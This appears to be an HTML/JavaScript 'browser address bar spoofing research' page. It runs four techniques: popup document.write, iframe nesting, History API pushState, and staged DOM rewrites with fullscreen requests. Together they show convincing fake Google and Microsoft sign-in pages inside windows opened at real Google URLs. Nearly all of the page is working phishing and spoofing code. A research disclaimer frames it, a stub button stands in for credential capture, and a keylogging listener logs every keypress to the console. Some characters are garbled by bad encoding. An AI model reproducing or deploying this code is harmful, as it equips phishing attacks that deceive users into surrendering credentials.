<!DOCTYPE html>
<html>
<head>
    <title>Window Management Research</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
            background: #f5f5f5;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            color: #856404;
        }
        .test-section {
            background: white;
            padding: 20px;
            margin: 20px 0;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        button {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            background: #0056b3;
        }
        .log {
            background: #e9ecef;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            font-family: monospace;
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="warning">
        锔 <strong>FOR SECURITY RESEARCH ONLY</strong> - This script is for authorized browser security testing in controlled environments.
    </div>

    <h1>Browser Address Bar Spoofing Research</h1>
    <p>Testing various window manipulation techniques for browser security research</p>

    <div class="test-section">
        <h2>Technique 1: Multi-Phase Window Transformation</h2>
        <button onclick="testTechnique1()">Run Technique 1</button>
        <p>Combines multiple window states and content replacement strategies.</p>
    </div>

    <div class="test-section">
        <h2>Technique 2: Frame-based Address Bar Obfuscation</h2>
        <button onclick="testTechnique2()">Run Technique 2</button>
        <p>Uses iframe nesting and window reference manipulation.</p>
    </div>

    <div class="test-section">
        <h2>Technique 3: History API + Window State Manipulation</h2>
        <button onclick="testTechnique3()">Run Technique 3</button>
        <p>Leverages History API combined with window features.</p>
    </div>

    <div class="test-section">
        <h2>Technique 4: Delayed DOM Reconstruction</h2>
        <button onclick="testTechnique4()">Run Technique 4</button>
        <p>Gradual content replacement with timing variations.</p>
    </div>

    <div class="log" id="log"></div>

<script>
let researchLog = [];

function log(message) {
    const timestamp = new Date().toLocaleTimeString();
    const logEntry = `[${timestamp}] ${message}`;
    researchLog.push(logEntry);
    
    const logElement = document.getElementById('log');
    logElement.innerHTML = logEntry + '<br>' + logElement.innerHTML;
    console.log(logEntry);
}

// Utility function to create convincing phishing page
function createSpoofedContent(targetDomain) {
    const domains = {
        'google': {
            title: 'Google Account Login',
            url: 'https://accounts.google.com',
            style: `
                body { font-family: 'Google Sans', Arial, sans-serif; background: #f8f9fa; margin: 0; }
                .container { max-width: 450px; margin: 50px auto; padding: 48px 40px 36px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .logo { text-align: center; margin-bottom: 24px; }
                h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
                .subtitle { color: #5f6368; margin-bottom: 32px; }
                input { width: 100%; padding: 13px 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
                input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
                button { width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 14px; font-weight: 500; margin-top: 24px; cursor: pointer; }
                button:hover { background: #1664c4; }
                .footer { text-align: center; margin-top: 32px; color: #5f6368; font-size: 12px; }
            `
        },
        'microsoft': {
            title: 'Microsoft Account',
            url: 'https://login.microsoftonline.com',
            style: `
                body { font-family: 'Segoe UI', Arial, sans-serif; background: #f2f2f2; margin: 0; }
                .container { max-width: 440px; margin: 80px auto; padding: 40px; background: white; border-radius: 4px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                .logo { color: #0078d4; font-size: 24px; font-weight: 600; margin-bottom: 24px; }
                h1 { font-size: 24px; font-weight: 300; margin-bottom: 20px; }
                input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; }
                button { width: 100%; background: #0078d4; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 15px; margin-top: 20px; cursor: pointer; }
                button:hover { background: #005a9e; }
            `
        }
    };
    
    const target = domains[targetDomain] || domains.google;
    
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>${target.title}</title>
            <style>${target.style}</style>
            <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22></text></svg>">
        </head>
        <body>
            <div class="container">
                <div class="logo">${targetDomain === 'google' ? 'G' : 'Microsoft'}</div>
                <h1>Sign in</h1>
                <div class="subtitle">to continue to ${targetDomain === 'google' ? 'Google services' : 'Microsoft'}</div>
                
                <input type="text" placeholder="Email or phone" id="username">
                <input type="password" placeholder="Password" id="password">
                
                <button onclick="alert('This is a security test page. No credentials were sent.')">Next</button>
                
                <div class="footer">
                    ${targetDomain === 'google' 
                        ? '漏 2024 Google 路 Privacy 路 Terms' 
                        : '漏 2024 Microsoft 路 Privacy 路 Cookies'}
                </div>
            </div>
            
            <script>
                // Prevent credential capture in research environment
                document.querySelectorAll('input').forEach(input => {
                    input.addEventListener('focus', function() {
                        console.log('[Security Research] Input field focused - no data collection');
                    });
                });
                
                // Simulate browser address bar hiding attempts
                let fullscreenAttempts = 0;
                document.addEventListener('click', function(e) {
                    if (fullscreenAttempts < 2) {
                        if (document.documentElement.requestFullscreen) {
                            document.documentElement.requestFullscreen().catch(e => {
                                console.log('[Research] Fullscreen blocked:', e);
                            });
                        }
                        fullscreenAttempts++;
                    }
                });
                
                // Log interactions for research
                document.addEventListener('keydown', function(e) {
                    console.log('[Research] Key pressed:', e.key);
                });
            <\/script>
        </body>
        </html>
    `;
}

// Technique 1: Multi-Phase Window Transformation
function testTechnique1() {
    log("Starting Technique 1: Multi-Phase Window Transformation");
    
    // Phase 1: Open window with legitimate appearance
    const win = window.open(
        'https://www.google.com/gen_204',
        '_blank',
        'width=800,height=600,menubar=no,toolbar=no,location=no,status=no'
    );
    
    if (!win) {
        log("Error: Popup blocked by browser");
        return;
    }
    
    // Phase 2: Rapid content transformation
    let phase = 0;
    const phases = [
        () => {
            win.document.write('<html><head><title>Loading...</title></head><body style="background: #fff; font-family: Arial;">Loading secure content...</body></html>');
            win.document.close();
            log("Phase 1: Initial loading screen");
        },
        () => {
            // Try to manipulate window appearance
            try {
                win.document.title = "Google Accounts";
                win.document.body.style.backgroundColor = "#f8f9fa";
                log("Phase 2: Title and styling updated");
            } catch(e) {
                log("Phase 2 error: " + e.message);
            }
        },
        () => {
            // Full content replacement
            win.document.write(createSpoofedContent('google'));
            win.document.close();
            log("Phase 3: Full spoofed content loaded");
            
            // Attempt to hide browser UI elements
            setTimeout(() => {
                try {
                    // Multiple fullscreen attempts
                    if (win.document.documentElement.requestFullscreen) {
                        win.document.documentElement.requestFullscreen();
                        log("Attempted fullscreen mode");
                    }
                } catch(e) {
                    log("Fullscreen error: " + e.message);
                }
            }, 500);
        }
    ];
    
    // Execute phases with timing variations
    phases.forEach((phaseFunc, index) => {
        setTimeout(() => {
            try {
                phaseFunc();
            } catch(e) {
                log(`Phase ${index} execution error: ${e.message}`);
            }
        }, 300 * index);
    });
}

// Technique 2: Frame-based Address Bar Obfuscation
function testTechnique2() {
    log("Starting Technique 2: Frame-based Obfuscation");
    
    const win = window.open(
        'about:blank',
        '_blank',
        'width=600,height=400,menubar=no,toolbar=yes,location=yes,scrollbars=yes'
    );
    
    if (!win) {
        log("Popup blocked");
        return;
    }
    
    win.document.write(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Google Services</title>
            <style>
                body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
                iframe { width: 100%; height: 100%; border: none; }
                .warning { position: absolute; top: 0; left: 0; right: 0; background: yellow; padding: 10px; text-align: center; z-index: 1000; }
            </style>
        </head>
        <body>
            <div class="warning">锔 Security Test Page - Research Only</div>
            <iframe src="about:blank" id="contentFrame"></iframe>
            
            <script>
                // Dynamic iframe content loading
                setTimeout(() => {
                    const frame = document.getElementById('contentFrame');
                    frame.contentDocument.open();
                    frame.contentDocument.write(\`${createSpoofedContent('microsoft')}\`);
                    frame.contentDocument.close();
                    
                    // Attempt to manipulate parent window appearance
                    try {
                        window.document.title = "Microsoft Account Login";
                    } catch(e) {
                        console.log('Title manipulation blocked');
                    }
                }, 800);
                
                // Simulate browser chrome interaction
                document.addEventListener('click', () => {
                    console.log('[Research] Click detected - simulating UI interaction');
                });
            <\/script>
        </body>
        </html>
    `);
    win.document.close();
    
    log("Frame-based window created with delayed content loading");
}

// Technique 3: History API + Window State Manipulation
function testTechnique3() {
    log("Starting Technique 3: History API Manipulation");
    
    const win = window.open(
        'https://www.google.com/search?q=test',
        '_blank',
        'width=700,height=500,menubar=no,toolbar=no,location=yes,status=yes'
    );
    
    if (!win) {
        log("Popup blocked");
        return;
    }
    
    // Wait for window to load
    setTimeout(() => {
        try {
            // First, write legitimate looking content
            win.document.write(`
                <html>
                <head>
                    <title>Google Search Results</title>
                    <meta http-equiv="refresh" content="2;url=about:blank">
                </head>
                <body>
                    <div style="padding: 20px; font-family: Arial;">
                        <h1>Loading search results...</h1>
                        <p>Please wait while we secure your connection.</p>
                    </div>
                </body>
                </html>
            `);
            win.document.close();
            log("Initial content written with meta refresh");
            
            // Secondary transformation
            setTimeout(() => {
                try {
                    win.history.pushState({}, '', '/secure-login');
                    win.document.write(createSpoofedContent('google'));
                    win.document.close();
                    
                    // Try to modify window features dynamically
                    try {
                        win.document.body.addEventListener('click', () => {
                            win.focus();
                            win.blur();
                            // Rapid focus/blur cycles might affect UI rendering
                        });
                    } catch(e) {
                        log("Event manipulation error: " + e.message);
                    }
                    
                    log("History state manipulated and content replaced");
                } catch(e) {
                    log("History manipulation error: " + e.message);
                }
            }, 1500);
            
        } catch(e) {
            log("Initial manipulation error: " + e.message);
        }
    }, 1000);
}

// Technique 4: Delayed DOM Reconstruction
function testTechnique4() {
    log("Starting Technique 4: Delayed DOM Reconstruction");
    
    const win = window.open(
        'about:blank',
        '_blank',
        'width=550,height=350,resizable=yes,scrollbars=no'
    );
    
    if (!win) {
        log("Popup blocked");
        return;
    }
    
    // Create a multi-stage loading process
    const stages = [
        {
            delay: 0,
            content: '<html><head><title>Connecting...</title></head><body style="background: #1a73e8; color: white; padding: 40px; font-family: Arial;">Establishing secure connection...</body></html>'
        },
        {
            delay: 400,
            content: '<html><head><title>Google</title></head><body style="background: white; padding: 20px;"><div style="text-align: center; padding: 50px;">Verifying security credentials...</div></body></html>'
        },
        {
            delay: 800,
            content: '<html><head><title>Security Check</title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin: 0; background: #f8f9fa;"></body></html>'
        },
        {
            delay: 1200,
            content: createSpoofedContent('google')
        }
    ];
    
    stages.forEach(stage => {
        setTimeout(() => {
            try {
                win.document.open();
                win.document.write(stage.content);
                win.document.close();
                log(`Stage loaded after ${stage.delay}ms`);
                
                // Attempt to trigger fullscreen at strategic moments
                if (stage.delay === 1200) {
                    setTimeout(() => {
                        try {
                            if (win.document.documentElement.requestFullscreen) {
                                win.document.documentElement.requestFullscreen().then(() => {
                                    log("Fullscreen activated on final stage");
                                }).catch(e => {
                                    log("Fullscreen rejected: " + e.message);
                                });
                            }
                            
                            // Add visual feedback mechanism
                            win.document.body.style.transition = 'all 0.3s';
                            win.document.body.style.boxShadow = '0 0 30px rgba(0,0,0,0.2)';
                        } catch(e) {
                            log("Final stage error: " + e.message);
                        }
                    }, 300);
                }
            } catch(e) {
                log(`Stage ${stage.delay}ms error: ${e.message}`);
            }
        }, stage.delay);
    });
    
    log("Multi-stage delayed loading initiated");
}

// Initialize
log("Browser Security Research Tool Initialized");
log("User Agent: " + navigator.userAgent);
log("Window features available: " + (window.open ? "Yes" : "No"));

// Security disclaimer
console.log("%c SECURITY RESEARCH TOOL", "color: red; font-size: 20px; font-weight: bold;");
console.log("%cThis tool is for authorized browser security testing only.", "color: orange;");
console.log("%cDo not use for malicious purposes.", "color: red;");
</script>
</body>
</html>